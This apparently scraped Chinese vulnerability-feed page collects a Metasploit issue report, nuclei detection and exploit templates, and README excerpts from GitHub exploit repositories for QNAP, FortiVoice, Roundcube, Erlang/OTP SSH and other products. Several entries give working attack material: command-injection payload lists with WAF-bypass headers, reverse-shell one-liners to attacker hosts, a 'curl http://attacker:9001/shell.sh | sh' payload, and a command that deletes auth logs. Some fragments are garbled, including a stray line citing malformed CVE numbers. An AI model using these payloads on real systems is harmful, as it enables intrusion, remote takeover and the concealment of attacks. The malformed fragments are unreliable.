posts.title: enum_chrome module SYSTEM权限下崩溃漏洞
posts.text: 漏洞信息漏洞名称： enum_chrome module SYSTEM权限下崩溃漏洞 漏洞类型： 权限绕过 漏洞等级： 中危 漏洞描述： 在metasploit-framework的enum_chrome模块中，当以SYSTEM权限运行时会导致崩溃，并且会话处于不可用状态，直到用户执行rev2self命令恢复steal_token调用。此问题在64位的Server 2019实例上被发现，且在使用#18558的更改后出现。通过禁用token窃取和迁移逻辑可以临时解决此问题，但可能影响自动解密功能。 产品厂商： rapid7 产品名称： metasploit-framework 来源： https://github.com/rapid7/metasploit-framework/issues/18559 类型： rapid7/metasploit-framework:github issues 来源概述When running the post/windows/gather/enum_chrome module, it will crash when run as NT AUTHORITY\SYSTEM. I noticed this issue while making the changes in #18558. After the module fails, it should also be noted that the sessions is left in a pretty unusable state until the user runs rev2self to revert the steal_token call. The target is a 64-bit Server 2019 instance and the changes from #18558 are loaded on my test branch. 123456789101112131415161718192021222324252627282930313233343536meterpreter > getuidServer username: NT AUTHORITY\SYSTEMmeterpreter > sysinfoComputer : DCOS : Windows 2016+ (10.0 Build 17763).Architecture : x64System Language : en_USDomain : MSFLABLogged On Users : 9Meterpreter : x64/windowsmeterpreter > run post/windows/gather/enum_chrome[*] Impersonating token: 1332[-] Cannot impersonate: stdapi_sys_config_steal_token: Operation failed: Access is denied.[-] Post failed: Rex::Post::Meterpreter::RequestError stdapi_sys_config_getsid: Operation failed: Access is denied.[-] Call stack:[-] /home/smcintyre/Repositories/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb:46:in `getsid'[-] /home/smcintyre/Repositories/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/sys/config.rb:54:in `is_system?'[-] /home/smcintyre/Repositories/metasploit-framework/lib/msf/core/post/windows/priv.rb:128:in `is_system?'[-] /home/smcintyre/Repositories/metasploit-framework/modules/post/windows/gather/enum_chrome.rb:349:in `run'meterpreter > getuid[-] stdapi_sys_config_getuid: Operation failed: Access is denied.meterpreter > sysinfo[-] stdapi_sys_config_getuid: Operation failed: Access is denied.meterpreter > rev2selfmeterpreter > getuidServer username: NT AUTHORITY\SYSTEMmeterpreter > sysinfoComputer : DCOS : Windows 2016+ (10.0 Build 17763).Architecture : x64System Language : en_USDomain : MSFLABLogged On Users : 9Meterpreter : x64/windowsmeterpreter > After implementing the following quick workaround the module runs as NT AUTHORITY\SYSTEM but with a warning about automatic decryption not being possible. The module also works as intended after migrating into a process running as a local admin. 12345678910111213141516diff --git a/modules/post/windows/gather/enum_chrome.rb b/modules/post/windows/gather/enum_chrome.rbindex 6e7e169425..181d87028c 100644--- a/modules/post/windows/gather/enum_chrome.rb+++ b/modules/post/windows/gather/enum_chrome.rb@@ -326,9 +326,9 @@ class MetasploitModule < Msf::Post # If we can impersonate a token, we use that first. # If we can't, we'll try to MIGRATE (more aggressive) if the user wants to- got_token = steal_token+ got_token = false # steal_token if !got_token && datastore['MIGRATE']- migrate_success = migrate+ migrate_success = false # migrate end host = session.session_host Testing Output 123456789101112131415161718192021222324252627282930meterpreter > getuidServer username: NT AUTHORITY\SYSTEMmeterpreter > sysinfoComputer : DCOS : Windows 2016+ (10.0 Build 17763).Architecture : x64System Language : en_USDomain : MSFLABLogged On Users : 9Meterpreter : x64/windowsmeterpreter > run post/windows/gather/enum_chrome[*] Running as SYSTEM, extracting user list...[!] (Automatic decryption will not be possible. You might want to manually migrate, or set "MIGRATE=true")[*] Users found: smcintyre[*] Extracting data for user 'smcintyre'...[+] Downloaded Web Data to '/home/smcintyre/.msf4/loot/20231120171644_default_192.168.159.10_chrome.raw.WebD_079520.txt'[-] Cookies not found[+] Downloaded History to '/home/smcintyre/.msf4/loot/20231120171645_default_192.168.159.10_chrome.raw.Histo_048081.txt'[+] Downloaded Login Data to '/home/smcintyre/.msf4/loot/20231120171646_default_192.168.159.10_chrome.raw.Login_624182.txt'[-] Bookmarks not found[+] Downloaded Preferences to '/home/smcintyre/.msf4/loot/20231120171646_default_192.168.159.10_chrome.raw.Prefe_808569.txt'[*] Extensions installed: [*] => Web Store[*] => Google Docs Offline[*] => Chrome PDF Viewer[*] => Google Network Speech[*] => Google Hangouts[*] => Chrome Web Store Paymentsmeterpreter > I’m not sure why the token impersonation or automatic migration is required. But it looks like removing it causes the module work work as I would expect it to work. It should be noted that if the session is running as SYSTEM and the module migrates into a process running as a user, it won’t be able to migrate back into the SYSTEM process due to the loss of privileges. My guess is that the MIGRATE option was originally intended to be used to migrate into the explorer.exe process owned by the current non-SYSTEM user. Further testing for edge cases should probably take place before just removing the token impersonation and migration logic.

Final score authentication (using assumption/API/V1/Admin/*). 🔍 Reference sourceCisco ADVISORY CVE‑20124 & Cve‑20125 - Receive RCE level & ignore the required authentication.

posts.text: 漏洞信息漏洞名称： Motive eSIM Secure Connect Panel 信息泄露漏洞 漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： 检测到暴露的Motive eSIM Secure Connect (EIM)面板，用于管理eSIM/iSIM配置。这些接口的公开访问可能允许攻击者查看或与敏感操作（如EID管理和批量配置）交互，导致信息泄露或对IoT/移动连接服务的未授权控制。 产品厂商： motive_software_solutions 产品名称： Motive eSIM Secure Connect Panel 搜索语法： inurl:”bulk-profile-operation”, inurl:”eid-management”, inurl:”eid-management-new” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/240dd421ed17388468901dceca75d897aec56945/http%2Fexposed-panels%2Fmotive-eim-panel.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情12345678910111213141516171819202122232425262728293031323334353637383940414243444546id: motive-eim-panelinfo: name: Motive eSIM Secure Connect Panel - Exposure Detection author: miguelse severity: high description: | Detects exposed Motive eSIM Secure Connect (EIM) panels used for managing eSIM/iSIM provisioning. Public access to these interfaces may allow attackers to view or interact with sensitive operations such as EID management and bulk provisioning, leading to information disclosure or unauthorized control over IoT/mobile connectivity services. classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L cvss-score: 8.6 cwe-id: CWE-200 reference: - https://motive.com/eim metadata: verified: true max-request: 1 vendor: motive_software_solutions product: motive_esim google-query: - inurl:"bulk-profile-operation" - inurl:"eid-management" - inurl:"eid-management-new" tags: panel,motive,eim,esim,iothttp: - method: GET path: - '{{BaseURL}}/eIMConfiguration' - '{{BaseURL}}/eid-management' - '{{BaseURL}}/eid-management-new' - '{{BaseURL}}/bulk-profile-operation' stop-at-first-match: true matchers-condition: and matchers: - type: word part: body words: - <title>EIM</title> - type: status status: - 200

posts.text: 链接： https://github.com/advisories/GHSA-h6wp-g6vw-fx8q CVSS 评分： 9.8 参考链接： https://nvd.nist.gov/vuln/detail/CVE-2025-6098 https://github.com/newym/cve/blob/main/utt1.md https://github.com/newym/cve/blob/main/utt1.md#poc https://vuldb.com/?ctiid.312567 https://vuldb.com/?id.312567 https://vuldb.com/?submit.589437 https://github.com/advisories/GHSA-h6wp-g6vw-fx8q 描述： A vulnerability was found in UTT 进取 750W up to 5.0. It has been classified as critical. This affects the function strcpy of the file /goform/setSysAdm of the component API. The manipulation of the argument passwd1 leads to buffer overflow. It is possible to initiate the attack remotely. The exploit has been disclosed to the public and may be used. The vendor was contacted early about this disclosure but did not respond in any way.

posts.title: Motive eSIM Secure Connect Panel 信息泄露
posts.text: 漏洞信息漏洞名称： Motive eSIM Secure Connect Panel 信息泄露 漏洞类型： 信息泄露 漏洞等级： 高危 漏洞描述： 检测到Motive eSIM Secure Connect Panel，可能存在信息泄露漏洞。 产品厂商： motive_software_solutions 产品名称： motive_esim 搜索语法： inurl:”bulk-profile-operation” OR inurl:”eid-management” OR inurl:”eid-management-new” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/c2810863fe1087bc78e47d15bed9ea101eff28e5/http%2Fexposed-panels%2Fmotive-eim-panel.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142434445id: motive-eim-panelinfo: name: Motive eSIM Secure Connect Panel - Detect author: miguelse severity: high description: Motive eSIM Secure Connect Panel was detected. classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L cvss-score: 8.6 cwe-id: CWE-200 reference: - https://motive.com/eim metadata: verified: true max-request: 1 vendor: motive_software_solutions product: motive_esim google-query: - inurl:"bulk-profile-operation" - inurl:"eid-management" - inurl:"eid-management-new" tags: panel,motive,eim,esim,iothttp: - method: GET path: - '{{BaseURL}}/eIMConfiguration' - '{{BaseURL}}/eid-management' - '{{BaseURL}}/eid-management-new' - '{{BaseURL}}/bulk-profile-operation' stop-at-first-match: true matchers-condition: and matchers: - type: word part: body words: - <title>EIM</title> - type: status status: - 200

posts.title: Google Chrome 沙盒逃逸漏洞
posts.text: 漏洞信息漏洞名称： Google Chrome 沙盒逃逸漏洞 漏洞编号： CVE： CVE-2025-2783 漏洞类型： 权限绕过 漏洞等级： 高危 漏洞描述： 该项目是一个研究和教育模拟，旨在展示Google Chrome（版本134.0.6998.177）中沙盒逃逸漏洞的概念，通过Mojo IPC利用不当的句柄验证。 产品厂商： Google 产品名称： Google Chrome 影响版本： 134.0.6998.177 来源： https://github.com/byteReaper77/CVE-2025-2783-SandboxEscape 类型： CVE-2025:github search 仓库文件 SandBoxEscapeSim.c 来源概述

posts.title: QTS & QuTS Command Injection Vulnerability
posts.text: 漏洞信息漏洞名称： QTS & QuTS Command Injection Vulnerability 漏洞编号： CVE： CVE-2020-2509 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： QTS和QuTS hero因应用程序中不当的输入处理而包含命令注入漏洞，允许攻击者通过发送精心构造的输入执行任意命令。 产品厂商： QNAP 产品名称： QTS & QuTS hero 搜索语法： product:”qnap” 来源： https://github.com/projectdiscovery/nuclei-templates/issues/12355 类型： projectdiscovery/nuclei-templates:github issues 来源概述Description: QTS and QuTS hero contain a command injection caused by improper input handling in the application, letting attackers execute arbitrary commands, exploit requires attacker to send crafted input. Severity: CriticalPOC: https://github.com/jbaines-r7/overkill https://vulncheck.com/xdb/533b5e83b1eb https///github.com:jbaines-r7/overkill.git KEV: TrueShodan Query: product:"qnap" Acceptance Criteria: The template must include a complete POC and should not rely solely on version-based detection. Contributors are required to provide debug data(-debug) along with the template to help the triage team with validation or can also share a vulnerable environment like docker file. Rewards will only be given once the template is fully validated by the team. Templates that are incomplete or invalid will not be accepted. Avoid adding code templates for CVEs that can be achieved using HTTP, TCP, or JavaScript. Such templates are blocked by default and won’t produce results, so we prioritize creating templates with other protocols unless exceptions are made. You can check the FAQ for the Nuclei Templates Community Rewards Program here.

posts.title: QNAP QTS/QuTS 高级认证命令注入漏洞
posts.text: 漏洞信息漏洞名称： QNAP QTS/QuTS 高级认证命令注入漏洞 漏洞编号： CVE： CVE-2020-2509 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： QNAP QTS/QuTS中存在一个高级认证命令注入漏洞（CVE-2020-2509），攻击者可以通过发送特制的HTTP请求来执行任意命令。此漏洞利用了QNAP设备中的qapp_platform.cgi接口，通过精心构造的payload实现命令注入。漏洞利用包括多态payload、编码、高级WAF绕过头部以及灵活的body注入点。 产品厂商： QNAP 产品名称： QNAP QTS/QuTS 搜索语法： product:”qnap” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/3571b73013ff27b8eb9c071d7a965fe15ade34c1/http%2Fcves%2F2020%2Fcve-2020-2509-qnap-rce-advanced.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990id: cve-2020-2509-qnap-rce-ultrainfo: name: QNAP QTS/QuTS - Advanced Authenticated Command Injection (CVE-2020-2509) author: malek838 severity: critical description: | Ultra-advanced nuclei template exploiting CVE-2020-2509 in QNAP QTS/QuTS with enhanced evasion. Includes polymorphic payloads, encoding, advanced WAF bypass headers, and flexible body injection points. reference: - https://github.com/jbaines-r7/overkill - https://vulncheck.com/xdb/533b5e83b1eb tags: cve,cve2020,qnap,rce,command-injection,authenticated,bounty,obfuscation,waf-bypass metadata: shodan-query: 'product:"qnap"' max-request: 12 verified: truehttp: - method: POST path: - "{{BaseURL}}/cgi-bin/qapp_platform.cgi" headers: User-Agent: "{{user_agent}}" X-Forwarded-For: "127.0.0.1" X-Originating-IP: "127.0.0.1" X-Remote-IP: "127.0.0.1" X-Remote-Addr: "127.0.0.1" X-Requested-With: "XMLHttpRequest" Accept-Language: "en-US,en;q=0.9" Referer: "{{BaseURL}}/dashboard" Origin: "{{BaseURL}}" Content-Type: "application/json" payloads: payload: - "|id|" - ";id;" - "`id`" - "$(id)" - "|echo aWQK|base64 -d|sh" - "i\"\"d" # bypass some filters - "$(which\\ id)" - "$(ec\\ho uid=999)" # fake echo payload - "`whoami`" - "`cat /etc/passwd | grep admin`" - "|sleep${IFS}1|id" - ";curl${IFS}example.com;" # dummy outbound payload user_agent: - "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" - "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)" - "Mozilla/5.0 (X11; Linux x86_64)" - "curl/7.68.0" - "Wget/1.20.3 (linux-gnu)" body: | { "platform": "{{payload}}", "name": "{{payload}}", "desc": "{{payload}}" } attack: pitchfork stop-at-first-match: true matchers-condition: and matchers: - type: word part: body condition: or words: - "uid=" - "gid=" - "root" - "admin" - type: status status: - 200 extractors: - type: regex part: body regex: - "uid=.*?gid=.*" - "root:.*?:[0-9]+:[0-9]+"

posts.title: Fortinet FortiVoice AuthHash 缓冲区溢出漏洞
posts.text: 漏洞信息漏洞名称： Fortinet FortiVoice AuthHash 缓冲区溢出漏洞 漏洞编号： CVE： CVE-2025-32756 漏洞类型： 缓冲区溢出 漏洞等级： 严重 漏洞描述： Fortinet FortiVoice存在一个基于栈的缓冲区溢出漏洞，允许未经认证的攻击者通过/remote/hostcheck_validate中的AuthHash cookie执行远程代码。此漏洞尝试使用300个字符的’A’负载在AuthHash中触发漏洞，并根据已知的服务器错误字符串和FortiVoice头检测成功。 产品厂商： fortinet 产品名称： FortiVoice 搜索语法： http.title:”FortiVoice” body=”FortiVoice” 来源： https://github.com/projectdiscovery/nuclei-templates/blob/3571b73013ff27b8eb9c071d7a965fe15ade34c1/http%2Fcves%2F2025%2Fcve-2025-32756-fortivoice.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566id: cve-2025-32756-fortivoiceinfo: name: Fortinet FortiVoice AuthHash Buffer Overflow RCE (CVE-2025-32756) author: hacer-ko severity: critical description: | A stack-based buffer overflow in Fortinet FortiVoice allows unauthenticated attackers to execute remote code via the AuthHash cookie in /remote/hostcheck_validate. This template attempts to trigger the vulnerability using a 300-character 'A' payload in the AuthHash, and detects success based on known server error strings and FortiVoice headers. reference: - https://nvd.nist.gov/vuln/detail/CVE-2025-32756 - https://fortiguard.fortinet.com/psirt/FG-IR-25-254 - https://github.com/projectdiscovery/nuclei-templates/pull/12322 classification: cve-id: CVE-2025-32756 cwe-id: CWE-121 metadata: verified: true max-request: 1 vendor: fortinet product: fortivoice shodan-query: http.title:"FortiVoice" fofa-query: body="FortiVoice" tags: - cve - cve2025 - fortinet - fortivoice - rce - overflow - intrusive - auth-bypassrequests: - method: POST path: - "{{BaseURL}}/remote/hostcheck_validate" headers: Cookie: "AuthHash=enc={{repeat('A', 300)}}" User-Agent: nuclei-scanner matchers-condition: or matchers: - type: status status: - 500 - type: word part: body words: - "buffer overflow" - "Segmentation fault" - "core dumped" - "backtrace" - "stack smashing" condition: or - type: word part: header words: - "FortiVoice" extractors: - type: regex part: body regex: - "(?i)(segmentation fault|stack smashing|core dumped|backtrace)"

posts.title: Next.js Middleware Bypass Vulnerability
posts.text: 漏洞信息漏洞名称： Next.js Middleware Bypass Vulnerability 漏洞编号： CVE： CVE-2025-29927 漏洞类型： 权限绕过 漏洞等级： 严重 漏洞描述： Next.js中存在一个严重漏洞（CVE-2025-29927），允许攻击者通过操纵内部标头x-middleware-subrequest来绕过中间件的安全检查，从而获得对受保护路由的未授权访问。影响版本包括11.1.4至12.3.4、13.0.0至13.5.8、14.0.0至14.2.24和15.0.0至15.2.2。建议用户更新到修复版本或实施二次验证以防止此漏洞。 产品厂商： Next.js 产品名称： Next.js 影响版本： 11.1.4 - 12.3.4, 13.0.0 - 13.5.8, 14.0.0 - 14.2.24, 15.0.0 - 15.2.2 来源： https://github.com/KamalideenAK/poc-cve-2025-29927 类型： CVE-2025:github search 仓库文件 .eslintrc.json .gitignore README.md app exploit.js middleware.ts next.config.js package-lock.json package.json public tailwind.config.ts tsconfig.json 来源概述Next.js Middleware Bypass (CVE-2025-29927) Proof of ConceptThis repository contains a proof of concept (POC) for CVE-2025-29927, a critical vulnerability in Next.js that allows attackers to bypass authorization checks implemented in middleware. 📋 Table of Contents Running the POC Application Using the Exploit Script How to Fix the Vulnerability Vulnerability Details Running the POC ApplicationThis Next.js application demonstrates the vulnerability with a protected dashboard route. Setup Instructions Clone the repository Install and run: 123npm installnpm run buildnpm run start Access http://localhost:3000 in your browser Try accessing the protected dashboard at /dashboard Using the Exploit ScriptThe exploit script can test any Next.js application for this vulnerability. Usage1npm run exploit <target-url> Example1npm run exploit http://localhost:3000/dashboard How it WorksThe exploit tool: Takes a target URL as input Makes a normal request to check if the route is protected Attempts to bypass middleware using the x-middleware-subrequest header Compares responses to determine vulnerability Sample Output123456789=== Next.js CVE-2025-29927 Middleware Bypass Tester ===Target: http://localhost:3000/dashboardTesting vulnerability...Normal request status: 307Bypass request status: 200⚠️ VULNERABLEThe route is protected but accessible with the bypass header How to Fix the VulnerabilityA fix implementation is available in the how-to-fix branch. Quick Fixes Update Next.js Version (Recommended) Update to one of these patched versions: Next.js 15.x → 15.2.3 Next.js 14.x → 14.2.25 Next.js 13.x → 13.5.9 Next.js 12.x → 12.3.5 Implement Secondary Validation Add authentication checks in your API routes/pages Don’t rely solely on middleware for security Sample Output1234567891011121314=== Next.js CVE-2025-29927 Middleware Bypass Tester ===Target: http://localhost:3000/dashboardTesting vulnerability...Making request without bypass header...Making request with bypass header...Normal request status: 307Bypass request status: 307✓ NOT VULNERABLE - Protected RouteThe route is protected and the bypass attempt was unsuccessfulNormal request redirected to: /Bypass request redirected to: / Vulnerability DetailsCVE Information CVE ID: CVE-2025-29927 Affected Versions: 13.0.0 - 13.5.8 14.0.0 - 14.2.24 15.0.0 - 15.2.2 11.1.4 - 12.3.4 DescriptionNext.js uses an internal header x-middleware-subrequest to prevent recursive requests. This vulnerability allows attackers to bypass middleware security checks by manipulating this header. Impact Unauthorized access to protected routes Bypass of authentication checks Circumvention of security middleware Affected Environments Self-hosted Next.js applications using Middleware References Next.js Security Advisory GitHub Security Advisory DisclaimerThis tool is provided for educational and testing purposes only. Only use this tool on systems you own or have explicit permission to test.

posts.title: Roundcube Webmail 反序列化漏洞
posts.text: 漏洞信息漏洞名称： Roundcube Webmail 反序列化漏洞 漏洞编号： CVE： CVE-2025-49113 漏洞类型： 反序列化 漏洞等级： 高危 漏洞描述： Roundcube Webmail在1.5.10之前和1.6.x在1.6.11之前的版本中，由于program/actions/settings/upload.php中的_from参数未经验证，导致认证用户可以通过PHP对象反序列化执行远程代码。 产品厂商： Roundcube 产品名称： Roundcube Webmail 影响版本： 1.5.x < 1.5.10, 1.6.x < 1.6.11 来源： https://github.com/Yuri08loveElaina/CVE-2025-49113 类型： CVE-2025:github search 仓库文件 README.md exploit.py 来源概述VIETNAMESE ✅ Tính năng: Hỗ trợ upload payload.phar Tự động đoán path nếu không biết chính xác Cho phép sử dụng phar:// path tùy chọn Có tùy chọn –upload-payload, –auto-path, –direct-path 🧪 Cách dùng: Tạo payload: phpggc monolog/rce1 system ‘id’ -p phar -o payload.phar Upload và khai thác tự động: python3 exploit.py https://target.com SESSIONID –upload-payload payload.phar –auto-path Upload và tự nhập path nếu biết chính xác đường dẫn : python3 exploit.py https://target.com SESSIONID –upload-payload payload.phar –direct-path /var/www/html/temp/payload.phar Không upload, chỉ khai thác: python3 exploit.py https://target.com SESSIONID –direct-path /var/www/html/temp/payload.phar ✅ Bạn có thể thay SESSIONID bằng session hợp lệ của Roundcube. ENGLISH ✅ Features: Support uploading payload.phar Automatically guess the path if not exactly known Allow the use of phar:// path option There are options –upload-payload, –auto-path, –direct-path 🧪 How to use: Create payload: phpggc monolog/rce1 system ‘id’ -p phar -o payload.phar Upload and exploit automatically: python3 exploit.py https://target.com SESSIONID –upload-payload payload.phar –auto-path Upload and enter the path yourself if you know the exact path: python3 exploit.py https://target.com SESSIONID –upload-payload payload.phar –direct-path /var/www/html/temp/payload.phar Do not upload, just exploit: python3 exploit.py https://target.com SESSIONID –direct-path /var/www/html/temp/payload.phar ✅ You can replace SESSIONID with a valid Roundcube session.

posts.title: Erlang/OTP SSH 远程代码执行漏洞
posts.text: 漏洞信息漏洞名称： Erlang/OTP SSH 远程代码执行漏洞 漏洞编号： CVE： CVE-2025-32433 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： Erlang/OTP是一套为Erlang编程语言设计的库。在版本OTP-27.3.3、OTP-26.2.5.11和OTP-25.3.2.20之前，SSH服务器可能允许攻击者执行未经认证的远程代码执行（RCE）。通过利用SSH协议消息处理中的缺陷，攻击者可以在受影响系统上执行任意命令。 产品厂商： Erlang 产品名称： Erlang/OTP 影响版本： < 27.3.3, < 26.2.5.11, < 25.3.2.20 来源： https://github.com/Yuri08loveElaina/CVE_2025_32433_exploit 类型： CVE-2025:github search 仓库文件 README.md elaina_cve_2025_32433.py 来源概述##VIETNAMESE## 🧠 Gợi ý sử dụng: Kiểm tra tệp tạo: python3 elaina_cve_2025_32433.py 192.168.1.10 22 ‘touch /tmp/pwned_by_elaina’ Reverse shell: python3 elaina_cve_2025_32433.py 192.168.1.10 22 ‘bash -i >& /dev/tcp/YOUR_IP/4444 0>&1’ 🔏 Ghi chú: Script không cần SSH key hoặc mật khẩu. Hoạt động trên các phiên bản Erlang/OTP SSH server bị ảnh hưởng (< 27.3.3, < 26.2.5.11, < 25.3.2.20). Gửi đúng định dạng SSH binary message theo RFC4253. 🧱 Giải nghĩa: touch: lệnh trong Unix/Linux dùng để tạo file trống. /tmp/pwned_by_elaina: đường dẫn đến file cần tạo trong thư mục /tmp, nơi mà hầu hết hệ thống Linux đều cho phép ghi. 🧪 Mục đích dùng trong exploit: Khi bạn chạy payload: python3 elaina_cve_2025_32433.py 192.168.1.10 22 ‘touch /tmp/pwned_by_elaina’thì: ✅ Nếu khai thác thành công, trên máy nạn nhân sẽ xuất hiện file: /tmp/pwned_by_elaina🚫 Nếu không xuất hiện file này, có thể payload bị chặn hoặc máy không bị ảnh hưởng. 🔎 Kiểm tra kết quả: Nếu bạn có shell vào máy nạn nhân, kiểm tra: ls -l /tmp/pwned_by_elaina 📌 Tùy chọn khác: Bạn có thể thay bằng bất kỳ lệnh nào bạn muốn, ví dụ: Gửi reverse shell: bash -i >& /dev/tcp/10.10.14.6/4444 0>&1 Xóa file log: rm -rf /var/log/auth.log ENGLISH ##🧠 Usage suggestions:## Check the generated file: python3 elaina_cve_2025_32433.py 192.168.1.10 22 ‘touch /tmp/pwned_by_elaina’ Reverse shell: python3 elaina_cve_2025_32433.py 192.168.1.10 22 ‘bash -i >& /dev/tcp/YOUR_IP/4444 0>&1’ ##🔏 Note: ## The script does not require an SSH key or password. Works on affected Erlang/OTP SSH server versions (< 27.3.3, < 26.2.5.11, < 25.3.2.20). Send the correct SSH binary message format according to RFC4253. 🧱 Explanation: touch: command in Unix/Linux used to create an empty file. /tmp/pwned_by_elaina: path to the file to create in the /tmp directory, where most Linux systems allow writing. 🧪 Purpose of use in exploit: When you run the payload: python3 elaina_cve_2025_32433.py 192.168.1.10 22 ‘touch /tmp/pwned_by_elaina’then: ✅ If the exploit is successful, the file will appear on the victim’s machine: /tmp/pwned_by_elaina🚫 If this file does not appear, the payload may be blocked or the machine is not affected. 🔎 Check the result: If you have a shell on the victim machine, check: ls -l /tmp/pwned_by_elaina 📌 Other options: You can replace it with any command you want, for example: Send a reverse shell: bash -i >& /dev/tcp/10.10.14.6/4444 0>&1 Delete the log file: rm -rf /var/log/auth.log

posts.title: DCBI-Netlog-LAB v1.0 - Command Injection
posts.text: 漏洞信息漏洞名称： DCBI-Netlog-LAB v1.0 - Command Injection 漏洞编号： CVE： CVE-2023-26802 漏洞类型： 命令执行 漏洞等级： 严重 漏洞描述： DCN (Digital China Networks) DCBI-Netlog-LAB v1.0 中的 /network_config/nsg_masq.cgi 组件存在漏洞，允许攻击者通过精心构造的请求绕过认证并执行任意命令。 产品厂商： dcnglobal 产品名称： DCBI-Netlog-LAB 影响版本： 1.0 来源： https://github.com/projectdiscovery/nuclei-templates/blob/ca66ab82bf085e072624101db1856e8c54de3199/http%2Fcves%2F2023%2FCVE-2023-26802.yaml 类型： projectdiscovery/nuclei-templates:github issues POC详情1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556id: CVE-2023-26802info: name: DCBI-Netlog-LAB v1.0 - Command Injection author: pussycat0x severity: critical description: | An issue in the component /network_config/nsg_masq.cgi of DCN (Digital China Networks) DCBI-Netlog-LAB v1.0 allows attackers to bypass authentication and execute arbitrary commands via a crafted request. reference: - https://web.archive.org/web/20230605051153/https://github.com/winmt/my-vuls/tree/main/DCN%20DCBI-Netlog-LAB classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2023-26802 cwe-id: CWE-22 epss-score: 0.00433 epss-percentile: 0.61837 cpe: cpe:2.3:o:dcnglobal:dcbi-netlog-lab_firmware:1.0:*:*:*:*:*:*:* metadata: vendor: dcnglobal product: dcbi-netlog-lab_firmware tags: cve,cve2023,rce,unauth,netlog,kevvariables: file_name: "{{rand_text_alpha(4)}}.html"http: - raw: - | GET /cgi-bin/network_config/nsg_masq.cgi?user_name=admin&session_id=../&lang=zh_CN.UTF-8&act=2&proto=;ls>/usr/local/lyx/lyxcenter/web/{{file_name}}; HTTP/1.1 Host: {{Hostname}} DNT: 1 X-Forwarded-For: 8.8.8.8 - | GET /{{file_name}} HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded DNT: 1 X-Forwarded-For: 8.8.8.8 matchers-condition: and matchers: - type: word part: body_2 words: - "nsg_bridge.cgi" - "nsg_dhcpactiveip.cgi" condition: and - type: status status: - 200

posts.title: Erlang/OTP SSH 预认证远程代码执行漏洞
posts.text: 漏洞信息漏洞名称： Erlang/OTP SSH 预认证远程代码执行漏洞 漏洞编号： CVE： CVE-2025-32433 漏洞类型： 命令执行 漏洞等级： 高危 漏洞描述： Erlang/OTP是一套为Erlang编程语言提供的库。在OTP-27.3.3、OTP-26.2.5.11和OTP-25.3.2.20之前的版本中，SSH服务器可能允许攻击者执行未经认证的远程代码执行（RCE）。通过利用SSH协议消息处理中的缺陷，攻击者可以在未认证的情况下执行远程代码。 产品厂商： Erlang 产品名称： Erlang/OTP 影响版本： version < OTP-27.3.3, version < OTP-26.2.5.11, version < OTP-25.3.2.20 来源： https://github.com/Yuri08loveElaina/CVE-2025-32433-Erlang-OTP-SSH-Pre-Auth-RCE-exploit 类型： CVE-2025:github search 仓库文件 README.md elaina_cve2025_32433.py 来源概述VIETNAMESE Cách sử dụng Quét một IP: python3 elaina_cve2025_32433.py –target 192.168.1.10 Quét nhiều IP từ file: python3 elaina_cve2025_32433.py –file targets.txt Khai thác nếu phát hiện lỗ hổng: python3 elaina_cve2025_32433.py –target 192.168.1.10 –exploit Tùy chọn payload: python3 elaina_cve2025_32433.py –target 192.168.1.10 –exploit –payload “curl http://attacker:9001/shell.sh | sh” Xuất ra JSON: python3 elaina_cve2025_32433.py –file targets.txt –json-output scan_result.json ENGLISH How to use Scan single IP:python3 elaina_cve2025_32433.py –target 192.168.1.10 Scan multiple IPs from file: python3 elaina_cve2025_32433.py –file targets.txt Exploit if vulnerability is found: python3 elaina_cve2025_32433.py –target 192.168.1.10 –exploit Payload options: python3 elaina_cve2025_32433.py –target 192.168.1.10 –exploit –payload “curl http://attacker:9001/shell.sh | sh” Output to JSON: python3 elaina_cve2025_32433.py –file targets.txt –json-output scan_result.json

The vulnerability is exploited by injecting a command via the timezone parameter. reference: - https://github.com/0xst4n/APSystems-ECU-R-RCE-Timezone - https://github.com/nomi-sec/PoC-in-GitHub classification: cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H cvss-score: 9.8 cve-id: CVE-2022-45699 cwe-id: CWE-78,CWE-94 epss-score: 0.12693 epss-percentile: 0.93636 cpe: cpe:2.3:o:apsystems:ecu-r_firmware:5203:*:*:*:*:*:*:* metadata: vendor: apsystems product: ecu-r_firmware tags: cve,cve2022,rce,apsystems,kevflow: http(1) && http(2)http: - raw: - | GET / HTTP/1.1 Host: {{Hostname}} matchers-condition: and matchers: - type: word part: body words: - "<title>Altenergy Power Control Software" internal: true - raw: - | POST /index.php/management/set_timezone HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded timezone=;wget+{{interactsh-url}};# matchers-condition: and matchers: - type: word part: interactsh_protocol words: - "http" - type: status status: - 200

